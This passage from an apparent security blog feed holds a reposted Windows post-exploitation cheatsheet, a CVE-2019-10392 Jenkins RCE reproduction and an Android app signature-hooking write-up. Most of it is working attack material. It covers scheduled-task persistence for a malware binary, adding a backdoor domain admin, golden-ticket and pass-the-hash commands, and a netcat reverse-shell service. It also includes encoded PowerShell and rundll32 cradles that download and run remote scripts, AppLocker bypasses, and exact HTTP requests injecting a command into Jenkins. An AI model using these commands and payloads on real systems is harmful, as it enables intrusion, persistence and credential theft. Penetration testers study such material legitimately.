/mo 1 /tn &quot;Malware&quot; /tr C:\Temp\SoftwareUpdate\Malware.exeThis will run Malware.exe every minute forever.# Run Malware.exe every day at 06:00amschtasks /create /tn &quot;SoftwareUpdate&quot; /tr C:\Temp\SoftwareUpdate\Malware.exe /sc daily /st 06:00# Runs a task each time the user&#39;s session is idle for 5 minutes.schtasks /create /tn &quot;SoftwareUpdate&quot; /tr C:\Temp\SoftwareUpdate\Malware.exe /sc onidle /i 5# Runs a a task as SYSTEM when User Logs in.schtasks /create /ru &quot;NT AUTHORITY\SYSTEM&quot; /rp &quot;&quot; /tn &quot;SoftwareUpdate&quot; /tr C:\Temp\SoftwareUpdate\Malware.exe /sc onlogon</code></pre><h4 id="Windows-Startup-Folder"><a href="#Windows-Startup-Folder" class="headerlink" title="Windows Startup Folder"></a>Windows Startup Folder</h4><pre><code>This has been around for years as basically every version of Windows contains a startup folder. Windows 10 - C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUpCurrent User Startup - C:\Users\Username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code></pre><h4 id="EXE-DLL-Hijacking"><a href="#EXE-DLL-Hijacking" class="headerlink" title="EXE/DLL Hijacking"></a>EXE/DLL Hijacking</h4><pre><code>Look for any missing DLL&#39;s or EXE&#39;s that common programs are calling on startup and over write them with your payload/malware.Also if you are localadmin/system you could provide over write a normal service binary or DLL, providing you don&#39;t break the execution.</code></pre><h4 id="Add-User-Account"><a href="#Add-User-Account" class="headerlink" title="Add User Account"></a>Add User Account</h4><pre><code>net user m0chan /add /domainnet group &quot;Domain Admins&quot; m0chan /add /domainnet localgroup &quot;Administrators&quot; /addnet user m0chan /domain /comment:&quot;Your Blueteam Fucking Sucks&quot;</code></pre><h4 id="Persistence-with-Kerberos"><a href="#Persistence-with-Kerberos" class="headerlink" title="Persistence with Kerberos"></a>Persistence with Kerberos</h4><pre><code>We can dump Kerberos tickets and inject them in session when deemed relevant however tickets have a low life span unless explically requested for 7 days. They can be injected into session with mimikatz or Rebeus. But let&#39;s say we have pwned a DC and got the KRBTGT Hash we can generate a golden ticket with a 10 year life span.kerberos::golden /user:utilisateur /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /krbtgt:310b643c5316c8c3c70a10cfb17e2e31 /ticket:utilisateur.chocolate.kirbi SID is the domain SIDInject Ticketkerberos::ptt Administrateur@krbtgt-CHOCOLATE.LOCAL.kirbiCan also inject kirbi with Rebeus</code></pre><h2 id="Lateral-Movement"><a href="#Lateral-Movement" class="headerlink" title="Lateral Movement"></a>Lateral Movement</h2><h4 id="Plink"><a href="#Plink" class="headerlink" title="Plink"></a>Plink</h4><pre><code>plink.exe -l root -pw password -R 445:127.0.0.1:445 YOURIPADDRESS#Windows 1803 Built in SSH Client (By Default)ssh -l root -pw password -R 445:127.0.0.1:445 YOURIPADDRESS</code></pre><h4 id="Powershell-Port-Forward"><a href="#Powershell-Port-Forward" class="headerlink" title="Powershell Port Forward"></a>Powershell Port Forward</h4><pre><code>netsh interface portproxy add v4tov4 listenport=fromport listenaddress=fromip connectport=toport connectaddress=toipPermanent ^^Requires iphlpsvc service to be enabledfromport: the port number to listen on, e.g. 80fromip: the ip address to listen on, e.g. 192.168.1.1toport: the port number to forward totoip: the ip address to forward to</code></pre><h4 id="Invoke-SocksProxy"><a href="#Invoke-SocksProxy" class="headerlink" title="Invoke-SocksProxy"></a>Invoke-SocksProxy</h4><pre><code>#https://github.com/p3nt4/Invoke-SocksProxy/Local Socks4 Proxy on 1080Import-Module .\Invoke-SocksProxy.psm1Invoke-SocksProxy -bindPort 1080Reverse Socks Proxy on Remote Machine Port 1080# On the remote host: # Generate a private key and self signed certopenssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout private.key -out cert.pem# Get the certificate fingerprint to verify it:openssl x509 -in cert.pem -noout -sha1 -fingerprint | cut -d &quot;=&quot; -f 2 | tr -d &quot;:&quot;# Start the handlerpython ReverseSocksProxyHandler.py 443 1080 ./cert.pem ./private.key# On the local host:Import-Module .\Invoke-SocksProxy.psm1Invoke-ReverseSocksProxy -remotePort 443 -remoteHost 192.168.49.130 # Go through the system proxy:Invoke-ReverseSocksProxy -remotePort 443 -remoteHost 192.168.49.130 -useSystemProxy# Validate certificateInvoke-ReverseSocksProxy -remotePort 443 -remoteHost 192.168.49.130 -useSystemProxy -certFingerprint &#39;93061FDB30D69A435ACF96430744C5CC5473D44E&#39;</code></pre><h4 id="Socat-for-Windows"><a href="#Socat-for-Windows" class="headerlink" title="Socat for Windows"></a>Socat for Windows</h4><pre><code>#https://github.com/StudioEtrange/socat-windowsGenerate SSL Cert for Encryptionopenssl req -new -x509 -days 365 -nodes -out cert.pem -keyout cert.keyServer : socat OPENSSL-LISTEN:443,cert=/cert.pem -Client : socat - OPENSSL:localhost:443#Port Forwardsocat OPENSSL-LISTEN:443,cert=/cert.pem,fork TCP:202.54.1.5:443All SSL Connections will be redirected to 202.54.1.5:443#Non SSL Port Forwardsocat TCP-LISTEN:80,fork TCP:202.54.1.5:80</code></pre><h4 id="SharpExec"><a href="#SharpExec" class="headerlink" title="SharpExec"></a>SharpExec</h4><pre><code>#https://github.com/anthemtotheego/SharpExecC# Implementation of Conventional Lateral Movement Techniques, such as -WMIExec - Semi-Interactive shell that runs as the user. Best described as a less mature version of Impacket&#39;s wmiexec.py tool.-SMBExec - Semi-Interactive shell that runs as NT Authority\System. Best described as a less mature version of Impacket&#39;s smbexec.py tool.-PSExec (like functionality) - Gives the operator the ability to execute remote commands as NT Authority\System or upload a file and execute it with or without arguments as NT Authority\System.-WMI - Gives the operator the ability to execute remote commands as the user or upload a file and execute it with or without arguments as the user.</code></pre><h4 id="Secure-Sockets-Funneling"><a href="#Secure-Sockets-Funneling" class="headerlink" title="Secure Sockets Funneling"></a>Secure Sockets Funneling</h4><pre><code>#https://0xdf.gitlab.io/2019/01/28/tunneling-with-chisel-and-ssf.html#ssf#git clone https://github.com/securesocketfunneling/ssf.gitMassive shout out to 0xdf for explaining this perfectly in his article. Couldnt have done it better myself. </code></pre><h4 id="Chisel-Fast-TCP-Tunnel-over-HTTP-secured-by-SSH"><a href="#Chisel-Fast-TCP-Tunnel-over-HTTP-secured-by-SSH" class="headerlink" title="Chisel (Fast TCP Tunnel over HTTP secured by SSH)"></a>Chisel (Fast TCP Tunnel over HTTP secured by SSH)</h4><pre><code>#https://0xdf.gitlab.io/2019/01/28/tunneling-with-chisel-and-ssf.html</code></pre><h4 id="CrackMapExec-1"><a href="#CrackMapExec-1" class="headerlink" title="CrackMapExec"></a>CrackMapExec</h4><pre><code>#https://www.ivoidwarranties.tech/posts/pentesting-tuts/cme/crackmapexec-lateral-movement/</code></pre><h4 id="WMIC-Spawn-Process"><a href="#WMIC-Spawn-Process" class="headerlink" title="WMIC Spawn Process"></a>WMIC Spawn Process</h4><pre><code>wmic /node:WS02 /user:DOMAIN\m0chan /password:m0chan process call create &quot;powershell.exe -Enc aQBlAHgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgA2AC8ARwBvAG8AZABuAGkAZwBoAHQALgBwAHMAMQAiACkAKQA7ACAAaQBmACgAWwBCAHkAcABhAHMAcwAuAEEATQBTAEkAXQA6ADoARABpAHMAYQBiAGwAZQAoACkAIAAtAGUAcQAgACIAMAAiACkAIAB7ACAAaQBlAHgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgA2AC8ASABSAEUAdgBlAG4AdABzAC4AcABzADEAIgApACkAIAB9AA==&quot;</code></pre><h4 id="WinRS"><a href="#WinRS" class="headerlink" title="WinRS"></a>WinRS</h4><pre><code>#https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/winrswinrs [/&lt;parameter&gt;[:&lt;value&gt;]] &lt;command&gt;  winrs /r:https://contoso.com commandwinrs /r:http://[1080:0:0:0:8:800:200C:417A]:80 command  winrs /r:myserver /ad /u:administrator /p:$%fgh7 dir \\anotherserver\share</code></pre><h4 id="Invoke-WMIExec-ps1"><a href="#Invoke-WMIExec-ps1" class="headerlink" title="Invoke-WMIExec.ps1"></a>Invoke-WMIExec.ps1</h4><pre><code>Invoke-WMIExec -Target 10.10.14.14 -Username rweston_da -Hash 3ff61fa259deee15e4042159d7b832fa -Command &quot;net user user pass /add /domain&quot;PS C:\users\user\Downloads&gt; Invoke-WMIExec -Target 10.10.120.1 -Username m0chan -Hash 3ff61fa259deee15e4042159d7b832fa -Command &quot;net group &quot;&quot;Domain Admins&quot;&quot; m0chan /add /domain&quot;</code></pre><h4 id="Powershell-Invoke-Command-Requires-Port-5985"><a href="#Powershell-Invoke-Command-Requires-Port-5985" class="headerlink" title="Powershell Invoke-Command (Requires Port 5985)"></a>Powershell Invoke-Command (Requires Port 5985)</h4><pre><code>$secpasswd = ConvertTo-SecureString &#39;pass&#39; -AsPlainText -Force$cred = New-Object System.Management.Automation.PSCredential(&#39;m0chan\user&#39;, $secpasswd)Invoke-Command -ComputerName FS01 -Credential $cred -ScriptBlock {whoami}</code></pre><h4 id="PSExec"><a href="#PSExec" class="headerlink" title="PSExec"></a>PSExec</h4><pre><code>psexec.exe \\dc01.m0chanAD.local cmd.exe</code></pre><h4 id="Powershell-Remoting"><a href="#Powershell-Remoting" class="headerlink" title="Powershell Remoting"></a>Powershell Remoting</h4><pre><code>$secpasswd = ConvertTo-SecureString &#39;password&#39; -AsPlainText -Force$cred = New-Object System.Management.Automation.PSCredential(&#39;WS02\USER&#39;, $secpasswd)$Session = New-PSSession -ComputerName FileServer -Credential $credEnter-PSSession $Session</code></pre><h4 id="Configure-Remote-Service-over-SMB-Requires-Local-Admin-on-Target-Machine"><a href="#Configure-Remote-Service-over-SMB-Requires-Local-Admin-on-Target-Machine" class="headerlink" title="Configure Remote Service over SMB (Requires Local Admin on Target Machine)"></a>Configure Remote Service over SMB (Requires Local Admin on Target Machine)</h4><pre><code>net use \\192.168.0.15 [password] /u:DOMAIN\m0chansc \\192.168.0.15 create &lt;service_name&gt; binpath= &quot;cmd.exe /k COMMAND&quot;sc \\192.168.0.15 create &lt;service_name&gt; binpath= &quot;cmd.exe /k &lt;c:\tools\nc.exe -L -p &lt;port&gt; -e cmd.exe&gt;&quot;sc \\192.168.0.15 start &lt;service_name&gt;</code></pre><h4 id="Pass-The-Hash"><a href="#Pass-The-Hash" class="headerlink" title="Pass-The-Hash"></a>Pass-The-Hash</h4><pre><code>crackmapexec &lt;ip&gt; -u &lt;user&gt; -H &quot;&lt;lm&gt;&quot; -x &quot;&lt;msfvenom psh-cmd&gt;&quot;impacket-wmiexec &lt;user&gt;@&lt;ip&gt; -hashes &lt;lm:nt&gt;pth-winexe -U &lt;user&gt;%&lt;ntlm&gt; //&lt;ip&gt; &quot;&lt;msfvenom psh-cmd&gt;&quot;python wmiexec.py -hashes :&lt;hash&gt; &lt;user&gt;@&lt;ip&gt;xfreerdp /u:&lt;user&gt; /d:&lt;domain&gt; /pth:&lt;ntlm&gt; /v:&lt;ip&gt;:3389 /dynamic-resolutionsekurlsa::pth /user:Administrateur /domain:chocolate.local /ntlm:cc36cf7a8514893efccd332446158b1a</code></pre><h4 id="Pass-The-Ticket"><a href="#Pass-The-Ticket" class="headerlink" title="Pass-The-Ticket"></a>Pass-The-Ticket</h4><pre><code>#Check my Blog Post Kerberos Attacks in Depth for Further InformationRebeus monitor /interval:30 Monitoring logon sessions every 30 seconds so I can pinch Kerb ticketsReubus will now give you a Kerberos ticket in base64 which you can pass withRubeus.exe ptt /ticket:[base64blobhere]We can now request TGS service tickets to access network resources as this user</code></pre><h2 id="Obfuscation-Evasion-Techniques"><a href="#Obfuscation-Evasion-Techniques" class="headerlink" title="Obfuscation / Evasion Techniques"></a>Obfuscation / Evasion Techniques</h2><h4 id="Invoke-Obfusaction"><a href="#Invoke-Obfusaction" class="headerlink" title="Invoke-Obfusaction"></a>Invoke-Obfusaction</h4><pre><code class="powershell.exe">#https://github.com/danielbohannon/Invoke-ObfuscationCan obfusacte Scripts &amp; Commands Obfusacte script from remote url SET SCRIPTPATH https://thisdosentexist.m0chan.com/Invoke-Mimikatz.ps1Can also set Sscript block base64 PSSET SCRIPTBLOCK powershell -enc VwByAGkAdABlAC0ASABvAHMAdAAgACcAWQBvAHUAIABjAGEAbgAgAHUAcwBlACAAYgBhAHMAaQBjACAALQBlAG4A==</code></pre><h4 id="Invoke-CradleCraft"><a href="#Invoke-CradleCraft" class="headerlink" title="Invoke-CradleCraft"></a>Invoke-CradleCraft</h4><pre><code>#https://github.com/danielbohannon/Invoke-CradleCrafterSimilar to Invoke-Obfusaction but allows you to obfusacte cradles for downloading i/eIEX (New-Object Net.WebClient).DownloadString(&#39;http://c2server.com/Invoke-Mimikatz.ps1&#39;)</code></pre><h4 id="Invoke-DOSfuscation"><a href="#Invoke-DOSfuscation" class="headerlink" title="Invoke-DOSfuscation"></a>Invoke-DOSfuscation</h4><pre><code>#https://github.com/danielbohannon/Invoke-DOSfuscation</code></pre><h4 id="Unicorn"><a href="#Unicorn" class="headerlink" title="Unicorn"></a>Unicorn</h4><p><a href="https://github.com/trustedsec/unicorn" target="_blank" rel="noopener">https://github.com/trustedsec/unicorn</a></p><pre><code>unicorn.py Nishang.ps1</code></pre><h2 id="AppLocker-Constrained-Mode-Bypasses"><a href="#AppLocker-Constrained-Mode-Bypasses" class="headerlink" title="AppLocker / Constrained Mode Bypasses"></a>AppLocker / Constrained Mode Bypasses</h2><h4 id="Verify-is-you-are-in-constrained-mode"><a href="#Verify-is-you-are-in-constrained-mode" class="headerlink" title="Verify is you are in constrained mode"></a>Verify is you are in constrained mode</h4><pre><code>$ExecutionContext.SessionState.LanguageMode</code></pre><h4 id="PowershellVeryLess-Bypass"><a href="#PowershellVeryLess-Bypass" class="headerlink" title="PowershellVeryLess Bypass"></a>PowershellVeryLess Bypass</h4><pre><code>git clone https://github.com/decoder-it/powershellveryless.gitC:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /reference: C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856ad364e35\system.management.automation.dll /out:C:\Users\m0chan\Scripts\powershellveryless.exe C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /reference:C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856ad364e35\system.management.automation.dll /out:c:\setup\powershellveryless.exe c:\scripts\powershellveryless.csExecute -&gt; powershellveryless.exe script.ps1script.ps1 = Script of your Choice</code></pre><h4 id="World-Writable-Folders-By-Default-on-Windows-10-1803"><a href="#World-Writable-Folders-By-Default-on-Windows-10-1803" class="headerlink" title="World Writable Folders (By Default on Windows 10 1803)"></a>World Writable Folders (By Default on Windows 10 1803)</h4><pre><code>#https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.mdC:\Windows\Tasks C:\Windows\Temp C:\windows\tracingC:\Windows\Registration\CRMLogC:\Windows\System32\FxsTmpC:\Windows\System32\com\dmpC:\Windows\System32\Microsoft\Crypto\RSA\MachineKeysC:\Windows\System32\spool\PRINTERSC:\Windows\System32\spool\SERVERSC:\Windows\System32\spool\drivers\colorC:\Windows\System32\Tasks\Microsoft\Windows\SyncCenterC:\Windows\SysWOW64\FxsTmpC:\Windows\SysWOW64\com\dmpC:\Windows\SysWOW64\Tasks\Microsoft\Windows\SyncCenterC:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System</code></pre><h4 id="Downgrade-Attack"><a href="#Downgrade-Attack" class="headerlink" title="Downgrade Attack"></a>Downgrade Attack</h4><pre><code>Downgrading to PS Version 2 circumvates Constrained Modepowershell.exe -version 2Verifiy versions with $PSVersionTableGet-Host</code></pre><h4 id="AppLocker-COR-Profile-Bypass"><a href="#AppLocker-COR-Profile-Bypass" class="headerlink" title="AppLocker COR Profile Bypass"></a>AppLocker COR Profile Bypass</h4><pre><code>set COR_ENABLE_PROFILING=1COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db}set COR_PROFILER_PATH=C:\Users\m0chan\pwn\reverseshell.dlltzsyncpowershellWhere .DLL is your payload i/e reverse shell, beacon etc. </code></pre><h4 id="MSBuild-Powershell-CMD-Bypass"><a href="#MSBuild-Powershell-CMD-Bypass" class="headerlink" title="MSBuild Powershell/CMD Bypass"></a>MSBuild Powershell/CMD Bypass</h4><pre><code>You can use this if cmd is not disabled but powershell ishttps://github.com/Cn33liz/MSBuildShell/blob/master/MSBuildShell.csprojC:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe pshell.csprojAlso https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f93cMSBuild PSAttack :D :D </code></pre><h4 id="PSAttack"><a href="#PSAttack" class="headerlink" title="PSAttack"></a>PSAttack</h4><pre><code>#https://github.com/jaredhaight/PSAttackUse if Powershell.exe is not available. this does not rely on powershell.exe, but Instead directly calls powershell through .NET Framework circumvating most application whitelisting etc.Has numerous modules prebuilt in and is built in C Sharp / .NET so can be reflectively loaded :)</code></pre><h4 id="NoPowerShell"><a href="#NoPowerShell" class="headerlink" title="NoPowerShell"></a>NoPowerShell</h4><pre><code>#https://github.com/bitsadmin/nopowershellPrimiarily to be used with Cobalt &amp; Execute Assembly but can also be reflectively loaded from any other C2 infra.</code></pre><h4 id="runDLL32-Bypass"><a href="#runDLL32-Bypass" class="headerlink" title="runDLL32 Bypass"></a>runDLL32 Bypass</h4><pre><code>#Reference: https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/rundll32.exe is a .exe found on all Windows based systems located at C:\Windows\system32\rundll32.exerundll32 shell32.dll,Control_RunDLL payload.dllrundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &lt;HTML Code&gt;rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString(&#39;http://ip:port/&#39;);&quot;rundll32.exe javascript:&quot;\..\mshtml.dll,RunHTMLApplication &quot;;eval(&quot;w=new%20ActiveXObject(\&quot;WScript.Shell\&quot;);w.run(\&quot;calc\&quot;);window.close()&quot;);rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();h=new%20ActiveXObject(&quot;WScript.Shell&quot;).run(&quot;calc.exe&quot;,0,true);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c taskkill /f /im rundll32.exe&quot;,0,true);}rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();GetObject(&quot;script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test&quot;)</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;文章是对windows后渗透的利用，提权和持久化等做的详细利用方式。&lt;/p&gt;
&lt;p&gt;原文搬运：&lt;a href=&quot;https://m0chan.github.io/2019/07/30/Windows-Notes-and-Cheatsheet.html&quot; target=&quot;_b
      
    
    </summary>
    
    
      <category term="web安全" scheme="/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-10392 Jenkins 2k19认证远程RCE</title>
    <link href="/2019/09/CVE-2019-10392-Jenkins-2k19%E8%AE%A4%E8%AF%81%E8%BF%9C%E7%A8%8BRCE/"/>
    <id>/2019/09/CVE-2019-10392-Jenkins-2k19认证远程RCE/</id>
    <published>2019-09-16T00:53:35.000Z</published>
    <updated>2019-09-16T00:55:29.584Z</updated>
    
    <content type="html"><![CDATA[<h3 id="CVE-2019-10392-Jenkins-2k19认证远程RCE"><a href="#CVE-2019-10392-Jenkins-2k19认证远程RCE" class="headerlink" title="CVE-2019-10392 Jenkins 2k19认证远程RCE"></a>CVE-2019-10392 Jenkins 2k19认证远程RCE</h3><p>使用以下命令在本地使用Docker启动了Jenkins实例：</p><pre><code>docker run -p 8080:8080 -p 50000:50000 jenkins/jenkins:lts-alpine</code></pre><p><img src="https://i.loli.net/2019/09/14/VDrZCMQjxm8poWw.png" alt="1568352912866.png"><br>版本为：Jenkins 2.176.3</p><p>git客户端：<a href="http://updates.jenkins-ci.org/download/plugins/git-client/2.8.2/git-client.hpi" target="_blank" rel="noopener">http://updates.jenkins-ci.org/download/plugins/git-client/2.8.2/git-client.hpi</a></p><p>git插件：<a href="http://updates.jenkins-ci.org/download/plugins/git/3.12.0/git.hpi" target="_blank" rel="noopener">http://updates.jenkins-ci.org/download/plugins/git/3.12.0/git.hpi</a></p><p>由于官方已经升级了client为2.8.5，git升级到3.12.1。所以需要手动上传插件，上传完成后如下。</p><p><img src="https://i.loli.net/2019/09/14/WfsrqQzT9Mvhb4L.png" alt="1568363887220.png"><br>新建用户user</p><p><img src="https://i.loli.net/2019/09/14/h8ENVnKz9ZHMOIQ.png" alt="1568360511189.png"><br>为账号配置权限，作者这里没看到给了create权限，如果需要使用普通账号来创建任务测试，则需要给create权限，或者已有任务的情况下来操作已有任务也是可以的，就不用给create权限，此处用create来测试。</p><p><img src="https://i.loli.net/2019/09/14/c4fBSXuvK2OEHRq.png" alt="1568361699347.png"><br>登陆user用户，可以看到用户界面如此</p><p><img src="https://i.loli.net/2019/09/14/A7lI9izS6gx5sVO.png" alt="1568361729634.png"><br>如下选择</p><p><img src="https://i.loli.net/2019/09/14/1XR896OmVUxeqkN.png" alt="1568364080901.png"><br>在SCM中选择git执行</p><p><img src="https://i.loli.net/2019/09/14/kz74ImPGY56t38y.png" alt="1568364120778.png"><br>查看git-ls-remote文档，从给的参数中可以注意到–upload-pack=<exec>。看起来像是执行了某些命令，而漏洞作者也是看到了这个参数的形式而采用了这个参数执行。</exec></p><p><a href="https://git-scm.com/docs/git-ls-remote.html" target="_blank" rel="noopener">https://git-scm.com/docs/git-ls-remote.html</a></p><p><img src="https://i.loli.net/2019/09/14/8Ad1gaqPtRzpE9W.png" alt="1568364256960.png"><br>参数的意义是：在远程主机上指定<em>git-upload-pack</em>的完整路径。这允许列出通过SSH访问的存储库中的引用，以及SSH守护程序不使用用户配置的PATH的位置。</p><p>如此，执行<code>--upload-pack=&quot;`id`&quot;</code></p><p><img src="https://i.loli.net/2019/09/14/5MgO1iJ6WDPIpL8.png" alt="1568364378513.png"><br>可以看到命令已经执行。</p><p>至于请求测试的话，和原作者得到写法有点出入，暂不知为何，但可以使用如下方式，请求如下，其中test2为任务名，获取Jenkins-Crumb</p><pre><code>GET /job/test2/configure HTTP/1.1Host: 192.168.253.139:8080Upgrade-Insecure-Requests: 1DNT: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3Referer: http://192.168.253.139:8080/job/test2/Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8Cookie: screenResolution=1536x864; JSESSIONID.b4706a48=node013tshj9ds2r3kr18mgmyaquc114.node0; JSESSIONID.83272e09=node0dt5602fpgb3a108885vr3228h9.node0Connection: close</code></pre><p><img src="https://i.loli.net/2019/09/14/sAZ6HQxywMufCS1.png" alt="1568365562645.png"><br>然后把获得的”Jenkins-Crumb”，携带到请求中</p><pre><code>POST /job/test2/descriptorByName/hudson.plugins.git.UserRemoteConfig/checkUrl HTTP/1.1Host: 192.168.253.139:8080Content-Length: 51Origin: http://192.168.253.139:8080Jenkins-Crumb: b2ecec81285edce6716900a2d4e1b687User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36Content-type: application/x-www-form-urlencoded; charset=UTF-8Accept: text/javascript, text/html, application/xml, text/xml, */*X-Prototype-Version: 1.7X-Requested-With: XMLHttpRequestDNT: 1Referer: http://192.168.253.139:8080/job/test2/configureAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8Cookie: screenResolution=1536x864; JSESSIONID.b4706a48=node013tshj9ds2r3kr18mgmyaquc114.node0; JSESSIONID.83272e09=node0dt5602fpgb3a108885vr3228h9.node0Connection: closevalue=--upload-pack%3D%22%60id%60%22&amp;credentialsId=</code></pre><p><img src="https://i.loli.net/2019/09/14/BDcNgMti8sx9EdJ.png" alt="1568365649803.png"><br>原文：<a href="https://iwantmore.pizza/posts/cve-2019-10392.html" target="_blank" rel="noopener">https://iwantmore.pizza/posts/cve-2019-10392.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;CVE-2019-10392-Jenkins-2k19认证远程RCE&quot;&gt;&lt;a href=&quot;#CVE-2019-10392-Jenkins-2k19认证远程RCE&quot; class=&quot;headerlink&quot; title=&quot;CVE-2019-10392 Jenkins 2
      
    
    </summary>
    
    
      <category term="web安全" scheme="/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Android Java Hook</title>
    <link href="/2019/09/Android-Java-Hook/"/>
    <id>/2019/09/Android-Java-Hook/</id>
    <published>2019-09-16T00:52:55.000Z</published>
    <updated>2019-09-16T00:55:47.295Z</updated>
    
    <content type="html"><![CDATA[<p>使用Inspeckage尝试hook其中的加密函数<br>环境：夜神模拟器<br>Inspeckage 2.3<br>某收件APP</p><h3 id="获取关键参数"><a href="#获取关键参数" class="headerlink" title="获取关键参数"></a>获取关键参数</h3><p>安装app后，抓包看到如下参数</p><p><img src="https://i.loli.net/2019/09/14/GQ56bvhFKjCupSg.png" alt="1568449534566.png"><br>在AK中搜索其中关键词fm和sign，搜索中发现sign过多，于是尝试搜索FM，搜索中发现如下class文件。</p><p><img src="https://i.loli.net/2019/09/14/M5sxOIrNcWGRgmn.png" alt="1568449857454.png"><br>打开Java源代码，在其中的一个void类型的b函数中发现关键。</p><p><img src="https://i.loli.net/2019/09/14/mZKoIc56aDSHOvQ.png" alt="1568449940990.png"><br>打开对应文件的sha256函数</p><p><img src="https://i.loli.net/2019/09/14/9uC4LD8gSOwnRil.png" alt="1568450012586.png"><br>基本可以确定加密算法为这个，对其中的三个参数加盐来sha256</p><p>paramString1对应了localObject5，也就是timestamp</p><p>paramString2对应了localObject4，也就是nonce</p><p>paramString3对应了localObject2，也是其中暂不得知道为何的参数</p><p>这几个参数，其中sign是不得知为什么参数，其他一个为uuid，一个为时间戳，于是我们尝试hook这个函数。</p><h3 id="配置HOOK"><a href="#配置HOOK" class="headerlink" title="配置HOOK"></a>配置HOOK</h3><p>在Inspeckage的界面中选着HOOK，点击找到左侧加载出来的函数方法</p><p><img src="https://i.loli.net/2019/09/14/ba7BqJAEGkZ2i9F.png" alt="1568450695050.png"><br>点击后如下，添加</p><p><img src="https://i.loli.net/2019/09/14/X8CN1PsOvVF3BDc.png" alt="1568450719164.png"><br>在模拟器中做一个请求，此处仍然使用之前的登陆请求，hook到的参数和结果</p><p><img src="https://i.loli.net/2019/09/14/kYxs6lBRUhZvGgH.png" alt="1568450803357.png"><br>其中result就是抓包到的请求sign参数，可以看到参数paramString3为一串拼接的字符串，其中密码为MD5加密，在hash选项中可以看到加密的原参数，和sha256用到的salt值</p><h3 id="加密尝试"><a href="#加密尝试" class="headerlink" title="加密尝试"></a>加密尝试</h3><p><img src="https://i.loli.net/2019/09/14/HOJcxiyjPNzKupB.png" alt="1568451215940.png"><br>那么尝试使用在线加密，从hook到的结果得知，paramString3就是请求中的FM字段</p><p><img src="https://i.loli.net/2019/09/14/x4fbPqWNnzLDApj.png" alt="1568451631004.png"><br>和请求中携带的sign参数对比为相同参数</p><p><img src="https://i.loli.net/2019/09/14/LQAYhwpBTN4HJbP.png" alt="1568451683666.png"><br>本以为会到此为止，但是当仔细查看hook的参数时发现，paramString3中的参数均是缺少标签对的，例如</p><pre><code>&lt;root&gt;123&lt;/root&gt;&lt;sign&gt;123&lt;/sign&gt;他只显示123&lt;/root&gt;123&lt;/sign&gt;</code></pre><p>暂没查到原因。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;使用Inspeckage尝试hook其中的加密函数&lt;br&gt;环境：夜神模拟器&lt;br&gt;Inspeckage 2.3&lt;br&gt;某收件APP&lt;/p&gt;
&lt;h3 id=&quot;获取关键参数&quot;&gt;&lt;a href=&quot;#获取关键参数&quot; class=&quot;headerlink&quot; title=&quot;获取关键参数&quot;
      
    
    </summary>
    
    
      <category term="Android逆向" scheme="/tags/Android%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>重放攻击</title>
    <link href="/2019/08/%E9%87%8D%E6%94%BE%E6%94%BB%E5%87%BB/"/>
    <id>/2019/08/重放攻击/</id>
    <published>2019-08-28T07:19:36.000Z</published>
    <updated>2019-08-28T07:25:16.604Z</updated>
    
